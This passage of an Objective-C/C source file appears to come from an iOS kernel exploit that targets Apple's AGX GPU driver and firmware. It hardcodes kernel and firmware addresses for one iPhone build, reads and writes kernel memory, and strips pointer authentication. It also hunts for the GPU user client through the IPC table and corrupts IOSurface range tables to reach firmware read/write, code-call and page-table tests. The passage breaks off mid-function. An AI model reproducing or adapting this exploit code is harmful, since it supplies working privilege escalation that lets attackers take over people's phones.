#import "agx.h"

#import <IOKit/IOKitLib.h>
#import <IOSurface/IOSurfaceRef.h>
#import <Metal/Metal.h>

#include <libkern/OSCacheControl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "common.h"
#include "krw.h"

#define PAGE_SIZE_16K ((size_t)0x4000)
#define AGX_WRITE_VALUE ((uint8_t)0xa5)

#define IOMACHPORT_VTABLE UINT64_C(0xfffffff007befdc0)
#define AGX_USERCLIENT_VTABLE UINT64_C(0xfffffff007c47ca8)
#define AGX_ACCELERATOR_G17P_VTABLE UINT64_C(0xfffffff007c4ff50)
#define AGX_FIRMWARE_G17P_VTABLE UINT64_C(0xfffffff007c4be98)
#define DEVICE_CONTROL_RING_VTABLE UINT64_C(0xfffffff007c491b0)
#define TASK_IPC_SPACE UINT64_C(0x318)
#define IPC_SPACE_TABLE UINT64_C(0x20)
#define IPC_ENTRY_SIZE UINT64_C(0x18)
#define IPC_PORT_KOBJECT UINT64_C(0x48)
#define PORT_LIMIT UINT64_C(65536)
#define SMR_BASE UINT64_C(2)
#define SMR_T1SZ_BOOT UINT64_C(17)

#define FIRMWARE_START UINT64_C(0xfffffc0000000000)
#define FIRMWARE_END UINT64_C(0xfffffc0000138418)
#define FIRMWARE_CONTROL_SOURCE (FIRMWARE_START + UINT64_C(0x400))
#define FIRMWARE_CONTROL_VALUE UINT64_C(0xaa0003f8d2800000)
#define SCHEDULER_GLOBAL UINT64_C(0xfffffc0000132a98)
#define POWER_RESOURCE UINT64_C(0xfffffc00000600d8)
#define POWER_PENDING (POWER_RESOURCE + UINT64_C(0x44))
#define POWER_EVENTS (POWER_RESOURCE + UINT64_C(0x48))
#define POWER_EVENT0 UINT64_C(0xfffffc000012b4f0)
#define SAMPLER_X20 UINT64_C(0xfffffc0000127df0)
#define GFX_AUTH_SCRATCH UINT64_C(0xfffffc0000112800)
#define GFX_FAKE_SUBSCRIBER (GFX_AUTH_SCRATCH + UINT64_C(0x080))
#define GFX_SIGNED_POWER_SLOT UINT64_C(0xfffffc0000132ac0)
#define GFX_SIGNED_POWER_CONTROL_SLOT UINT64_C(0xfffffc0000133070)
#define GFX_SIGNED_POWER_TARGET UINT32_C(0x0001ce88)
#define GFX_MBI_ROUTES UINT64_C(0xfffffc000005fff8)
#define GFX_MBI_ROUTE_HANDLE UINT64_C(0xfffffc0000060050)
#define GFX_SIGNED_MBI_TARGET UINT32_C(0x0002fa38)
#define GFX_AUTH_FAULT_OBJECT UINT64_C(0x0000000200000000)
#define GFX_UAT_WRITE_END (FIRMWARE_START + UINT64_C(0x02000000))
#define GFX_LEAF_SELF_MAP UINT64_C(0xfffffc0001fc8000)
#define GFX_TEST_ALIAS UINT64_C(0xfffffc0000200000)
#define GFX_TEST_ALIAS_INDEX ((GFX_TEST_ALIAS >> 14) & UINT64_C(0x7ff))
#define GFX_TEST_ALIAS_PTE (GFX_LEAF_SELF_MAP + GFX_TEST_ALIAS_INDEX * sizeof(uint64_t))
#define GFX_DATA_PAGE_DESCRIPTOR UINT64_C(0x0460000000000443)
#define GFX_MICROPPL_TEST_PHYSICAL UINT64_C(0x0000000041410000)
#define GFX_MICROPPL_MARKER UINT32_C(0x41414141)
#define COPYOUT_TABLE UINT64_C(0xfffffc000004daa0)
#define COPYOUT_STRIDE UINT64_C(0xe0)
#define COPYOUT_RESULT UINT64_C(0x14)
#define COPYOUT_COMMAND UINT32_C(30)
#define COPYOUT_SENTINEL UINT32_C(0xdeadbeef)
#define COPYOUT_MIN_OFFSET UINT64_C(0x800)
#define DEVICE_CONTROL_RING_OFFSET UINT64_C(0x9d8)
#define RTBUDDY_OWNER_OFFSET UINT64_C(0x17d0)
#define RTBUDDY_OWNER_VTABLE_START UINT64_C(0xfffffff007c44150)
#define RTBUDDY_OWNER_VTABLE_END UINT64_C(0xfffffff007c44e90)
#define RTBUDDY_PROVIDER_OFFSET UINT64_C(0x128)
#define RTBUDDY_CORE_OFFSET UINT64_C(0x88)
#define RTBUDDY_LOADED_FIRMWARE_OFFSET UINT64_C(0x21e0)
#define RTBUDDY_SEGMENTS_OFFSET UINT64_C(0xa0)
#define DROP_MARKER UINT32_C(0x41414141)
#define DROP_MARKER64 UINT64_C(0x4141414141414141)

#define CREATE_COMMAND_QUEUE UINT32_C(7)
#define CREATE_SHARED_MEMORY UINT32_C(13)
#define CREATE_NOTIFICATION_QUEUE UINT32_C(15)
#define SET_NOTIFICATION_QUEUE UINT32_C(25)
#define SUBMIT_COMMAND_BUFFERS UINT32_C(26)

#define IOGPU_TASK_MAP_LIST UINT64_C(0x1b8)
#define IOGPU_MAP_MEMORY UINT64_C(0x18)
#define IOGPU_MAP_TASK UINT64_C(0x20)
#define IOGPU_MAP_GPU_BASE UINT64_C(0x28)
#define IOGPU_MAP_NEXT UINT64_C(0x38)
#define IOGPU_MAP_LENGTH UINT64_C(0x48)
#define IOGPU_MAP_CAPACITY UINT64_C(0x50)
#define IOGPU_MEMORY_ACCESSOR UINT64_C(0x80)
#define IOGPU_ACCESSOR_CPU_BASE UINT64_C(0xb8)
#define IOGPU_ACCESSOR_LENGTH UINT64_C(0xc0)
#define IOGPU_ACCESSOR_GRANULE UINT64_C(0xc8)
#define MAX_IOGPU_TASK_MAPS 512U

_Static_assert(PAGE_SIZE_16K % EARLY_KRW_LENGTH == 0, "KRW chunk size must divide a 16 KiB page");

typedef struct {
    IOSurfaceRef surface;
    mach_port_t port;
    vm_address_t dummy_page;
    uint64_t ranges;
} mdsid_allocation_t;

typedef struct {
    uint32_t queue;
    uint64_t first_address;
    uint32_t first_id;
    uint64_t second_address;
    uint32_t second_id;
} command_buffers_t;

typedef struct {
    mach_port_t port;
    uint64_t ipc_table;
    uint64_t ipc_count;
    uint64_t device;
    uint64_t gpu;
    uint64_t state;
    uint64_t owner;
    uint64_t firmware_task;
    uint64_t map_vtable;
    uint64_t target_gfx;
    uint64_t target_cpu;
    uint32_t buffer_offset;
} drop_context_t;

typedef struct {
    uint64_t firmware;
    uint64_t index_block;
    uint64_t ring_buffer;
    uint64_t output_gpu_base;
    uint64_t output_cpu_base;
    uint64_t output_length;
    uint64_t output_entries[2];
} read_context_t;

static uint64_t __attribute__((naked)) strip_pac(uint64_t pointer) {
    __asm(".long 0xDAC143E0");  // XPACI X0
    __asm("ret");
}

static bool kernel_object_pointer(uint64_t pointer) {
    return pointer >= UINT64_C(0xffffffdc00000000) && pointer < UINT64_C(0xfffffff000000000) && (pointer & 7) == 0;
}

static bool firmware_pointer(uint64_t pointer) {
    return pointer >= FIRMWARE_START && pointer < FIRMWARE_END;
}

static bool gfx_write_pointer(uint64_t pointer) {
    return pointer >= FIRMWARE_START && pointer <= GFX_UAT_WRITE_END - sizeof(uint32_t) && (pointer & (sizeof(uint32_t) - 1)) == 0;
}

static bool read_kernel(uint64_t address, void* output, size_t size) {
    if (!output || size == 0 || address > UINT64_MAX - size) return false;
    memset(output, 0, size);
    for (size_t offset = 0; offset < size; offset += EARLY_KRW_LENGTH) {
        size_t chunk = size - offset;
        if (chunk > EARLY_KRW_LENGTH) chunk = EARLY_KRW_LENGTH;
        if (!early_kread_checked(address + offset, (uint8_t*)output + offset, chunk)) return false;
    }
    return true;
}

static bool read16(uint64_t address, uint16_t* value) {
    return value && read_kernel(address, value, sizeof(*value));
}

static bool read8(uint64_t address, uint8_t* value) {
    return value && read_kernel(address, value, sizeof(*value));
}

static bool read32(uint64_t address, uint32_t* value) {
    return value && read_kernel(address, value, sizeof(*value));
}

static bool read64(uint64_t address, uint64_t* value) {
    return value && early_kread64_checked(address, value);
}

static bool read_pointer(uint64_t address, uint64_t* pointer) {
    uint64_t raw = 0;
    if (!pointer || !read64(address, &raw)) return false;
    *pointer = strip_pac(raw);
    return kernel_object_pointer(*pointer);
}

static bool write16(uint64_t address, uint16_t value) {
    uint16_t observed = 0;
    return early_kwrite16_checked(address, value) && read16(address, &observed) && observed == value;
}

static bool write_kernel(uint64_t address, const void* input, size_t size) {
    if (!input || size == 0 || address > UINT64_MAX - size) return false;
    for (size_t offset = 0; offset < size; offset += EARLY_KRW_LENGTH) {
        size_t chunk = size - offset;
        if (chunk > EARLY_KRW_LENGTH) chunk = EARLY_KRW_LENGTH;
        if (!early_kwrite_checked(address + offset, (const uint8_t*)input + offset, chunk)) return false;
    }
    uint8_t check[EARLY_KRW_LENGTH];
    for (size_t offset = 0; offset < size; offset += sizeof(check)) {
        size_t chunk = size - offset;
        if (chunk > sizeof(check)) chunk = sizeof(check);
        if (!read_kernel(address + offset, check, chunk) || memcmp(check, (const uint8_t*)input + offset, chunk) != 0) return false;
    }
    return true;
}

static bool write8(uint64_t address, uint8_t value) {
    return write_kernel(address, &value, sizeof(value));
}

static bool write32(uint64_t address, uint32_t value) {
    uint32_t observed = 0;
    return early_kwrite32_checked(address, value) && read32(address, &observed) && observed == value;
}

static bool write64(uint64_t address, uint64_t value) {
    uint64_t observed = 0;
    return early_kwrite64_checked(address, value) && read64(address, &observed) && observed == value;
}

static const char* const test_arguments[AGX_TEST_COUNT] = {
    [AGX_TEST_ACQUIRE_ONLY] = "--acquire-only",
    [AGX_TEST_READ_CONTROL] = "--gfx-read-control",
    [AGX_TEST_READ] = "--gfx-read",
    [AGX_TEST_WRITE_CONTROL] = "--gfx-write-control",
    [AGX_TEST_WRITE_PANIC] = "--gfx-write-panic",
    [AGX_TEST_AUTH_CALL_CONTROL] = "--gfx-auth-call-control",
    [AGX_TEST_AUTH_CALL_PANIC] = "--gfx-auth-call-panic",
    [AGX_TEST_PAC_REUSE_CONTROL] = "--gfx-pac-reuse-control",
    [AGX_TEST_PAC_REUSE] = "--gfx-pac-reuse",
    [AGX_TEST_MICROPPL_CONTROL] = "--micro-ppl-ttbr1-control",
    [AGX_TEST_MICROPPL_PANIC] = "--micro-ppl-ttbr1-panic",
};

bool agx_test_mode_from_argument(const char* argument, agx_test_mode_t* mode) {
    if (!argument || !mode) return false;
    for (unsigned candidate = AGX_TEST_ACQUIRE_ONLY; candidate < AGX_TEST_COUNT; candidate++) {
        if (strcmp(argument, test_arguments[candidate]) == 0) {
            *mode = (agx_test_mode_t)candidate;
            return true;
        }
    }
    return false;
}

const char* agx_test_mode_name(agx_test_mode_t mode) {
    if (mode == AGX_TEST_SHADOW) return "shadow";
    return (unsigned)mode < AGX_TEST_COUNT && test_arguments[mode] ? test_arguments[mode] + 2 : "unknown";
}

bool agx_test_argument_valid(agx_test_mode_t mode, uint64_t argument) {
    if ((unsigned)mode >= AGX_TEST_COUNT) return false;
    if (mode != AGX_TEST_READ) return true;
    return argument >= FIRMWARE_START + 0x10 && argument <= FIRMWARE_END - 0x50 && (argument & 7) == 0;
}

static bool buffer_is_filled(const uint8_t* buffer, size_t length, uint8_t value) {
    for (size_t index = 0; index < length; index++) {
        if (buffer[index] != value) return false;
    }
    return true;
}

static bool verify_agx_buffer_rw(const uint8_t* input, size_t length) {
    id<MTLDevice> device = MTLCreateSystemDefaultDevice();
    if (!device) {
        LOG_ERR("Metal device unavailable");
        return false;
    }

    id<MTLCommandQueue> queue = [device newCommandQueue];
    id<MTLBuffer> source = [device newBufferWithBytes:input length:length options:MTLResourceStorageModeShared];
    id<MTLBuffer> copy = [device newBufferWithLength:length options:MTLResourceStorageModeShared];
    id<MTLBuffer> write = [device newBufferWithLength:length options:MTLResourceStorageModeShared];
    if (!queue || !source || !copy || !write || !copy.contents || !write.contents) {
        LOG_ERR("Metal shared-buffer allocation failed");
        return false;
    }

    for (size_t index = 0; index < length; index++) {
        ((uint8_t*)copy.contents)[index] = input[index] ^ 0xff;
    }
    memset(write.contents, (uint8_t)~AGX_WRITE_VALUE, length);

    id<MTLCommandBuffer> command = [queue commandBuffer];
    id<MTLBlitCommandEncoder> blit = [command blitCommandEncoder];
    if (!command || !blit) {
        LOG_ERR("Metal blit setup failed");
        return false;
    }

    [blit copyFromBuffer:source sourceOffset:0 toBuffer:copy destinationOffset:0 size:length];
    [blit fillBuffer:write range:NSMakeRange(0, length) value:AGX_WRITE_VALUE];
    [blit endEncoding];
    [command commit];
    [command waitUntilCompleted];
    if (command.status != MTLCommandBufferStatusCompleted) {
        const char* error = command.error.localizedDescription.UTF8String;
        LOG_ERR("Metal command failed (status=%ld, error=%s)", (long)command.status, error ?: "none");
        return false;
    }

    return memcmp(input, copy.contents, length) == 0 && buffer_is_filled(write.contents, length, AGX_WRITE_VALUE);
}

static bool read_root_page(uint64_t tte, uint8_t* page) {
    for (size_t offset = 0; offset < PAGE_SIZE_16K; offset += EARLY_KRW_LENGTH) {
        if (!early_kread_checked(tte + offset, page + offset, EARLY_KRW_LENGTH)) {
            LOG_ERR("root-table read failed at +%#zx", offset);
            return false;
        }
    }
    return true;
}

static bool capture_stable_root(uint64_t tte, uint8_t* snapshot) {
    uint8_t* check = malloc(PAGE_SIZE_16K);
    if (!check) return false;

    bool captured = read_root_page(tte, snapshot) && read_root_page(tte, check);
    bool stable = captured && memcmp(snapshot, check, PAGE_SIZE_16K) == 0;
    free(check);
    if (captured && !stable) LOG_ERR("root table changed during capture");
    return stable;
}

bool agx_buffer_rw_self_test(void) {
    @autoreleasepool {
        uint8_t* pattern = malloc(PAGE_SIZE_16K);
        if (!pattern) return false;
        for (size_t index = 0; index < PAGE_SIZE_16K; index++) {
            pattern[index] = (uint8_t)((index * 131u) ^ (index >> 3) ^ 0x5a);
        }

        bool passed = verify_agx_buffer_rw(pattern, PAGE_SIZE_16K);
        free(pattern);
        LOG("AGX shared-buffer read/write self-test=%s bytes=%#zx", passed ? "verified" : "failed", PAGE_SIZE_16K);
        return passed;
    }
}

bool agx_shadow_test(uint64_t self_pmap) {
    @autoreleasepool {
        if (!krw_is_kernel_address(self_pmap)) {
            LOG_ERR("invalid pmap address");
            return false;
        }

        uint64_t tte = 0;
        uint64_t ttep = 0;
        if (!early_kread64_checked(self_pmap, &tte) || !early_kread64_checked(self_pmap + 8, &ttep) || !krw_is_kernel_address(tte) || ttep == 0 || (ttep & (PAGE_SIZE_16K - 1)) != 0) {
            LOG_ERR("pmap TTE/TTEP read failed");
            return false;
        }

        uint8_t* snapshot = malloc(PAGE_SIZE_16K);
        if (!snapshot) return false;
        bool passed = capture_stable_root(tte, snapshot) && !buffer_is_filled(snapshot, PAGE_SIZE_16K, 0) && verify_agx_buffer_rw(snapshot, PAGE_SIZE_16K);
        free(snapshot);

        LOG("pmap tte=%#llx ttep=%#llx", tte, ttep);
        LOG("AGX root snapshot copy=%s bytes=%#zx", passed ? "verified" : "failed", PAGE_SIZE_16K);
        return passed;
    }
}

static uint64_t decode_smr_pointer(uint64_t raw) {
    // iPhone17,1-4 / 22G100 values used by the proven SRD kmem_read_smrptr path.
    uint64_t pointer = raw <= UINT64_C(0xfffffeffffffffff) ? strip_pac(raw) : raw;
    uint64_t base = SMR_BASE << (62 - SMR_T1SZ_BOOT);
    return (pointer & base) == 0 ? (pointer & ~UINT64_C(0x3fff)) | base : pointer & ~UINT64_C(0x1f);
}

static bool decode_ipc_table(uint64_t raw, uint64_t expected_base, uint64_t* base, uint64_t* count) {
    uint64_t stripped = strip_pac(raw);
    bool zone_encoded = (stripped & ~UINT64_C(0x1f)) == expected_base;
    bool vm_encoded = !zone_encoded && (expected_base & UINT64_C(0x3fff)) == 0;
    uint64_t size = 0;
    if (zone_encoded) {
        uint64_t exponent = raw & 0xf;
        uint64_t mantissa = 32 + (raw & 0x10);
        if (exponent >= 63 || mantissa > (UINT64_MAX >> exponent)) return false;
        size = mantissa << exponent;
    } else if (vm_encoded) {
        uint64_t pages = raw & 0x3fff;
        if (pages == 0 || pages > (UINT64_MAX >> 14)) return false;
        size = pages << 14;
    } else {
        return false;
    }

    uint64_t entries = size / IPC_ENTRY_SIZE;
    if (!kernel_object_pointer(expected_base) || (expected_base & UINT64_C(0x1f)) != 0 || entries < 2 || entries > PORT_LIMIT) return false;
    *base = expected_base;
    *count = entries;
    return true;
}

static bool current_ipc_table(uint64_t* base, uint64_t* count) {
    uint64_t space_raw = 0;
    uint64_t space = 0;
    uint64_t table_raw = 0;
    bool task_valid = kernel_object_pointer(g_ctx.self_task);
    bool space_read = task_valid && read64(g_ctx.self_task + TASK_IPC_SPACE, &space_raw);
    space = strip_pac(space_raw);
    bool space_valid = space_read && kernel_object_pointer(space);
    bool table_read = space_valid && read64(space + IPC_SPACE_TABLE, &table_raw);
    uint64_t table_smr = table_read ? decode_smr_pointer(table_raw) : 0;
    bool decoded = table_read && decode_ipc_table(table_raw, table_smr, base, count);
    if (!decoded) {
        LOG_ERR("IPC table decode task=%#llx space_raw=%#llx space=%#llx table_raw=%#llx stripped=%#llx smr=%#llx task_ok=%u space_read=%u space_ok=%u table_read=%u", g_ctx.self_task, space_raw,
                space, table_raw, strip_pac(table_raw), table_smr, task_valid, space_read, space_valid, table_read);
    }
    return decoded;
}

static uint64_t port_kobject(uint64_t table, uint64_t count, mach_port_t name) {
    uint64_t index = (uint64_t)name >> 8;
    uint64_t port = 0;
    uint64_t object = 0;
    if (index >= count || !read_pointer(table + index * IPC_ENTRY_SIZE, &port) || !read_pointer(port + IPC_PORT_KOBJECT, &object)) {
        return 0;
    }
    return object;
}

static uint64_t find_user_client(mach_port_t* port_out, uint64_t* table_out, uint64_t* count_out) {
    mach_port_name_array_t names = NULL;
    mach_port_type_array_t types = NULL;
    mach_msg_type_number_t name_count = 0;
    mach_msg_type_number_t type_count = 0;
    if (mach_port_names(mach_task_self(), &names, &name_count, &types, &type_count) != KERN_SUCCESS) return 0;

    uint64_t table = 0;
    uint64_t count = 0;
    uint64_t found = 0;
    mach_port_t found_port = MACH_PORT_NULL;
    if (!current_ipc_table(&table, &count)) {
        LOG_ERR("AGX user-client scan could not decode IPC table task=%#llx", g_ctx.self_task);
        goto done;
    }

    mach_msg_type_number_t limit = name_count < type_count ? name_count : type_count;
    unsigned objects = 0;
    unsigned wrappers = 0;
    for (mach_msg_type_number_t index = 0; index < limit; index++) {
        if ((types[index] & MACH_PORT_TYPE_SEND) == 0) continue;
        uint64_t object = port_kobject(table, count, names[index]);
        uint64_t vtable_raw = 0;
        if (!kernel_object_pointer(object) || !read64(object, &vtable_raw)) continue;
        objects++;
        uint64_t vtable = strip_pac(vtable_raw);
        if (vtable == AGX_USERCLIENT_VTABLE + g_ctx.kernel_slide) {
            found = object;
            found_port = names[index];
            break;
        }
        if (vtable != IOMACHPORT_VTABLE + g_ctx.kernel_slide) continue;
        wrappers++;

        uint64_t child = 0;
        uint64_t child_vtable_raw = 0;
        if (read_pointer(object + 0x30, &child) && read64(child, &child_vtable_raw) && strip_pac(child_vtable_raw) == AGX_USERCLIENT_VTABLE + g_ctx.kernel_slide) {
            found = child;
            found_port = names[index];
            break;
        }
    }
    LOG("AGX user-client scan names=%u table=%#llx count=%llu objects=%u wrappers=%u found=%#llx port=%#x expected=%#llx", limit, table, count, objects, wrappers, found, found_port,
        AGX_USERCLIENT_VTABLE + g_ctx.kernel_slide);

done:
    if (names) vm_deallocate(mach_task_self(), (vm_address_t)names, name_count * sizeof(*names));
    if (types) vm_deallocate(mach_task_self(), (vm_address_t)types, type_count * sizeof(*types));
    if (port_out) *port_out = found_port;
    if (table_out) *table_out = table;
    if (count_out) *count_out = count;
    return found;
}

static void free_mdsid_allocation(mdsid_allocation_t* allocation) {
    if (MACH_PORT_VALID(allocation->port)) mach_port_deallocate(mach_task_self(), allocation->port);
    if (allocation->surface) CFRelease(allocation->surface);
    if (allocation->dummy_page) vm_deallocate(mach_task_self(), allocation->dummy_page, PAGE_SIZE_16K);
    memset(allocation, 0, sizeof(*allocation));
}

static bool allocate_mdsid_table(uint64_t table, uint64_t count, mdsid_allocation_t* allocation) {
    memset(allocation, 0, sizeof(*allocation));
    if (vm_allocate(mach_task_self(), &allocation->dummy_page, PAGE_SIZE_16K, VM_FLAGS_ANYWHERE) != KERN_SUCCESS) return false;

    uint64_t* pairs = calloc(1, PAGE_SIZE_16K);
    if (!pairs) goto failure;
    for (size_t offset = 0; offset < PAGE_SIZE_16K; offset += 16) {
        pairs[offset / 8] = allocation->dummy_page;
        pairs[offset / 8 + 1] = PAGE_SIZE_16K;
    }

    CFDataRef data = CFDataCreate(kCFAllocatorDefault, (const UInt8*)pairs, PAGE_SIZE_16K);
    int64_t allocation_size = PAGE_SIZE_16K;
    CFNumberRef size_number = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &allocation_size);
    CFMutableDictionaryRef properties = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    free(pairs);
    pairs = NULL;
    if (data == NULL || size_number == NULL || properties == NULL) {
        if (data != NULL) CFRelease(data);
        if (size_number != NULL) CFRelease(size_number);
        if (properties != NULL) CFRelease(properties);
        goto failure;
    }
    CFDictionarySetValue(properties, CFSTR("IOSurfaceAllocSize"), size_number);
    CFDictionarySetValue(properties, CFSTR("IOSurfaceAddressRanges"), data);
    allocation->surface = IOSurfaceCreate(properties);
    CFRelease(properties);
    CFRelease(size_number);
    CFRelease(data);
    if (!allocation->surface) goto failure;

    allocation->port = IOSurfaceCreateMachPort(allocation->surface);
    uint64_t current_table = table;
    uint64_t current_count = count;
    if (!current_ipc_table(&current_table, &current_count)) goto failure;
    uint64_t wrapper = port_kobject(current_table, current_count, allocation->port);
    uint64_t wrapper_vtable_raw = 0;
    uint64_t send_right = 0;
    uint64_t surface = 0;
    uint64_t descriptor = 0;
    if (!MACH_PORT_VALID(allocation->port) || !kernel_object_pointer(wrapper) || !read64(wrapper, &wrapper_vtable_raw) || strip_pac(wrapper_vtable_raw) != IOMACHPORT_VTABLE + g_ctx.kernel_slide ||
        !read_pointer(wrapper + 0x30, &send_right) || !read_pointer(send_right + 0x18, &surface) || !read_pointer(surface + 0x30, &descriptor) ||
        !read_pointer(descriptor + 0x60, &allocation->ranges)) {
        goto failure;
    }

    uint64_t first_address = 0;
    uint64_t first_size = 0;
    uint64_t last_address = 0;
    uint64_t last_size = 0;
    uint64_t last = allocation->ranges + PAGE_SIZE_16K - 16;
    if (!read64(allocation->ranges, &first_address) || !read64(allocation->ranges + 8, &first_size) || !read64(last, &last_address) || !read64(last + 8, &last_size) ||
        first_address != allocation->dummy_page || first_size != PAGE_SIZE_16K || last_address != allocation->dummy_page || last_size != PAGE_SIZE_16K) {
        goto failure;
    }
    LOG("MDSID range table=%#llx dummy=%#llx", allocation->ranges, (uint64_t)allocation->dummy_page);
    return true;

failure:
    free(pairs);
    free_mdsid_allocation(allocation);
    return false;
}

static kern_return_t submit_pair(mach_port_t port, const command_buffers_t* buffers, uint32_t first_id, uint32_t second_id) {
    uint64_t scalar[4] = {buffers->queue, 0, 1, 56};
    uint8_t argument[56] = {};
    memcpy(argument, &first_id, sizeof(first_id));
    memcpy(argument + 4, &second_id, sizeof(second_id));
    return IOConnectCallMethod(port, SUBMIT_COMMAND_BUFFERS, scalar, 4, argument, sizeof(argument), NULL, NULL, NULL, NULL);
}

static kern_return_t submit(mach_port_t port, const command_buffers_t* buffers) {
    return submit_pair(port, buffers, buffers->first_id, buffers->second_id);
}

static bool setup_command_buffers(mach_port_t port, command_buffers_t* buffers) {
    memset(buffers, 0, sizeof(*buffers));
    uint8_t queue_input[0x408] = {};
    struct {
        uint32_t id;
        uint32_t padding;
        uint64_t counter;
    } queue = {};
    size_t queue_size = sizeof(queue);
    kern_return_t queue_kr = IOConnectCallStructMethod(port, CREATE_COMMAND_QUEUE, queue_input, sizeof(queue_input), &queue, &queue_size);

    uint64_t notification_input[2] = {256, 32};
    struct {
        uint64_t address;
        uint32_t id;
        uint32_t padding;
    } notification = {};
    size_t notification_size = sizeof(notification);
    kern_return_t notification_kr = IOConnectCallMethod(port, CREATE_NOTIFICATION_QUEUE, notification_input, 2, NULL, 0, NULL, NULL, &notification, &notification_size);

    uint64_t set_input[2] = {queue.id, notification.id};
    kern_return_t set_kr = KERN_FAILURE;
    if (queue_kr == KERN_SUCCESS && notification_kr == KERN_SUCCESS) {
        set_kr = IOConnectCallScalarMethod(port, SET_NOTIFICATION_QUEUE, set_input, 2, NULL, NULL);
    }

    struct {
        uint64_t address;
        uint32_t size;
        uint32_t id;
    } shared[2] = {};
    kern_return_t shared_kr[2] = {KERN_FAILURE, KERN_FAILURE};
    uint64_t shared_input[2] = {PAGE_SIZE_16K, 0};
    if (set_kr == KERN_SUCCESS) {
        for (unsigned index = 0; index < 2; index++) {
            size_t output_size = sizeof(shared[index]);
            shared_kr[index] = IOConnectCallMethod(port, CREATE_SHARED_MEMORY, shared_input, 2, NULL, 0, NULL, NULL, &shared[index], &output_size);
        }
    }

    bool ready = queue_kr == KERN_SUCCESS && notification_kr == KERN_SUCCESS && set_kr == KERN_SUCCESS && shared_kr[0] == KERN_SUCCESS && shared_kr[1] == KERN_SUCCESS && shared[0].address &&
                 shared[1].address && shared[0].size >= PAGE_SIZE_16K && shared[1].size >= PAGE_SIZE_16K;
    if (!ready) {
        LOG_ERR("AGX command setup failed queue=%#x note=%#x set=%#x shared=%#x/%#x", queue_kr, notification_kr, set_kr, shared_kr[0], shared_kr[1]);
        return false;
    }

    buffers->queue = queue.id;
    buffers->first_address = shared[0].address;
    buffers->first_id = shared[0].id;
    buffers->second_address = shared[1].address;
    buffers->second_id = shared[1].id;
    uint32_t* first = (uint32_t*)(uintptr_t)buffers->first_address;
    uint32_t* second = (uint32_t*)(uintptr_t)buffers->second_address;
    memset(first, 0, 0x40);
    memset(second, 0, 0x40);
    first[0] = 0x10002;
    first[1] = 0x10;
    second[2] = 1;
    second[3] = 0x40000001;
    second[5] = 0x10;
    __sync_synchronize();

    kern_return_t warmup_a = submit_pair(port, buffers, buffers->first_id, buffers->first_id);
    kern_return_t warmup_b = submit(port, buffers);
    LOG("AGX command queue=%u warmup=%#x/%#x", queue.id, warmup_a, warmup_b);
    return warmup_a == KERN_SUCCESS && warmup_b == KERN_SUCCESS;
}

static bool wait_for32_attempts(uint64_t address, uint32_t expected, uint32_t* observed_out, unsigned attempts) {
    uint32_t observed = 0;
    for (unsigned attempt = 0; attempt < attempts; attempt++) {
        if (read32(address, &observed) && observed == expected) {
            if (observed_out) *observed_out = observed;
            return true;
        }
        usleep(1000);
    }
    if (observed_out) *observed_out = observed;
    return false;
}

static bool wait_for32(uint64_t address, uint32_t expected, uint32_t* observed_out) {
    return wait_for32_attempts(address, expected, observed_out, 5000);
}

static bool resolve_drop_context(drop_context_t* context) {
    memset(context, 0, sizeof(*context));
    uint64_t user_client = find_user_client(&context->port, &context->ipc_table, &context->ipc_count);
    uint64_t gpu_vtable_raw = 0;
    uint64_t owner_vtable_raw = 0;
    uint64_t map = 0;
    uint64_t map_vtable_raw = 0;
    uint64_t owner_base = 0;
    uint64_t owner_size = 0;
    uint64_t owner_capacity = 0;
    uint64_t sysmem = 0;
    uint64_t accessor = 0;
    uint64_t cpu_base = 0;
    uint32_t dsids = 0;
    const char* stage = "user-client";
    if (!kernel_object_pointer(user_client) || !MACH_PORT_VALID(context->port)) goto object_failure;
    stage = "device";
    if (!read_pointer(user_client + 0x120, &context->device)) goto object_failure;
    stage = "accelerator";
    if (!read_pointer(context->device + 0x48, &context->gpu)) goto object_failure;
    stage = "accelerator-vtable";
    if (!read64(context->gpu, &gpu_vtable_raw) || strip_pac(gpu_vtable_raw) != AGX_ACCELERATOR_G17P_VTABLE + g_ctx.kernel_slide) goto object_failure;
    stage = "dsids";
    if (!read32(context->gpu + 0xf49c, &dsids) || dsids != 96) goto object_failure;
    stage = "drop-state";
    if (!read_pointer(context->gpu + 0x120b8, &context->state)) goto object_failure;
    stage = "buffer-offset";
    if (!read32(context->state + 0x540, &context->buffer_offset) || context->buffer_offset != 0x200) goto object_failure;
    stage = "owner";
    if (!read_pointer(context->state + 0x18a88, &context->owner)) goto object_failure;
    stage = "map";
    if (!read_pointer(context->state + 0x548, &map)) goto object_failure;
    stage = "firmware-task";
    if (!read_pointer(context->owner + IOGPU_MAP_TASK, &context->firmware_task)) goto object_failure;
    stage = "object-vtables";
    if (!read64(context->owner, &owner_vtable_raw) || !read64(map, &map_vtable_raw)) goto object_failure;
    stage = "owner-base";
    if (!read64(context->owner + 0x28, &owner_base) || (owner_base & UINT64_C(0xffffff0000000000)) != UINT64_C(0xfffffc0000000000)) goto object_failure;
    stage = "owner-size";
    if (!read64(context->owner + 0x48, &owner_size) || !read64(context->owner + 0x50, &owner_capacity) || owner_size != PAGE_SIZE_16K || owner_capacity != PAGE_SIZE_16K) goto object_failure;
    stage = "sysmem";
    if (!read_pointer(context->owner + 0x18, &sysmem)) goto object_failure;
    stage = "accessor";
    if (!read_pointer(sysmem + 0x80, &accessor)) goto object_failure;
    stage = "cpu-alias";
    if (!read64(accessor + 0xb8, &cpu_base) || !kernel_object_pointer(cpu_base) || (cpu_base & (PAGE_SIZE_16K - 1)) != 0) goto object_failure;
    goto object_ready;

object_failure:
    LOG_ERR("DropMDSID object gate failed at %s uc=%#llx port=%#x device=%#llx gpu=%#llx vt=%#llx dsids=%u state=%#llx off=%#x owner=%#llx map=%#llx base=%#llx size=%#llx/%#llx sysmem=%#llx "
            "accessor=%#llx cpu=%#llx",
            stage, user_client, context->port, context->device, context->gpu, strip_pac(gpu_vtable_raw), dsids, context->state, context->buffer_offset, context->owner, map, owner_base, owner_size,
            owner_capacity, sysmem, accessor, cpu_base);
    return false;

object_ready:;

    uint64_t owner_method_raw = 0;
    uint64_t map_method_raw = 0;
    uint8_t owner_method[12] = {};
    uint8_t map_method[12] = {};
    static const uint8_t expected_owner_method[12] = {
        0x5f, 0x24, 0x03, 0xd5, 0x00, 0x14, 0x40, 0xf9, 0xc0, 0x03, 0x5f, 0xd6,
    };
